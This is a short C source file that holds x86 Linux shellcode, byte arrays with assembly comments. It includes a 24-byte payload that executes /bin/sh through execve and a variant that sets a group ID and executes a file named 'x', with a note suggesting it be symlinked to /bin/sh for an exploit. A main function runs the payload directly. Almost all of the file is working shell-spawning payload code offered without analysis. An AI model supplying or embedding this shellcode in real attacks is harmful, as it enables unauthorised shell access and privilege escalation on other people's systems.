char code[] =
   "\x31\xc0"			/* xor %eax,%eax   2 */
   "\x99"			/* cdq - convert dbl
				   word to quad w. 1 */
   "\x52"			/* push  %edx 	   1 */
   "\x68\x6e\x2f\x73\x68"	/* push  "n / s h" 5 */
   "\x68\x2f\x2f\x62\x69"	/* push  "/ / b i" 5 */
   "\x89\xe3"			/* mov   %esp,%ebx 2 */
   "\x52"			/* push  %edx	   1 */
   "\x53"			/* push  %ebx	   1 */
   "\x89\xe1"			/* mov   %esp,%ecx 2 */
                       
   "\xb0\x0b"			/* mov    $0xb,%al 2 */
   "\xcd\x80";			/* int    0x80	   2 */

/* TOTAL                                          24 bytes! */

/****************************************************************/

/* executes something named "x" in current dir. - 16 bytes */
/* ln -s /bin/sh x ; exploit */

char x_code[] = "\x31\xdb\x31\xc9\xb3" GID "\xb1" GID "\x31\xc0\xb0\x47\xcd\x80"
		"\x31\xc0\x99\x52\x6a\x78\x89\xe3"
                "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
  void (*a)() = (void *)code;
  a();
  return 0;
}
